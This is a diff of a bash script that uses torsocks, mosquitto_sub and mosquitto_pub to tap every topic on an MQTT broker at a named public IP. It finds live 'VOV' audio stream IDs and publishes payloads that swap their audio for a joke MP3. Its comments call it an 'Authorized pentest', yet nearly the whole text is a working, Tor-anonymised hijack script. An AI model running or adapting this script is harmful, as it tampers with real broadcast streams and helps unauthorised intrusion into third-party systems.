@@ -1,29 +1,27 @@
 #!/bin/bash
-# HIJACK_VOV_STREAMS_REAL.sh - Solo topic :s:16 attivi
+# AUTO_VOV_HIJACK_PEPPE.sh - Auto-discover + Hijack (Authorized pentest)
 
-echo "🔍 Scanning LIVE VOV streams (:s:16)..."
-echo "📡 Broker: 42.1.64.56:1883"
+PEPPE_URL="https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"
+
+hijack_stream() {
+  local id=$1
+  local topic="${id}:s:16"
+  
+  payload='{"n":"'"$id"':s:16","m":"audio/mpeg","u":"'"$PEPPE_URL"'"}'
+  
+  if torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$topic" -m "$payload" >/dev/null 2>&1; then
+    echo "✅ HIJACK ${id:0:8}... FM (${topic})"
+  fi
+}
+
+echo "🎵 AUTO Peppe.mp3 HIJACK VOV (Authorized pentest)"
+echo "📡 42.1.64.56:1883 - Scanning live streams..."
 
 torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null | \
 while read -r line; do
+  # Cerca ID stream :s:16
   if [[ $line =~ \"n\":\"([0-9]{17}):s:16\" ]]; then
-    STREAM_ID="${BASH_REMATCH[1]}"
-    TOPIC="${STREAM_ID}:s:16"
-    
-    echo "🎯 LIVE STREAM: $TOPIC"
-    
-    # Payload DIRECT STREAM Peppe.mp3
-    PEPPE_PAYLOAD='{
-      "n":"'"$STREAM_ID"':s:16",
-      "m":"audio/mpeg",
-      "u":"https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3",
-      "t":"Peppe Brescia Poeta HIJACK"
-    }'
-    
-    echo "💉 Injecting Peppe.mp3 → $TOPIC"
-    torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPE_PAYLOAD" && \
-      echo "✅ PEPPPE HIJACKED: $TOPIC" || echo "❌ FAILED: $TOPIC"
-    
-    echo "---"
+    id="${BASH_REMATCH[1]}"
+    hijack_stream "$id"
   fi
 done
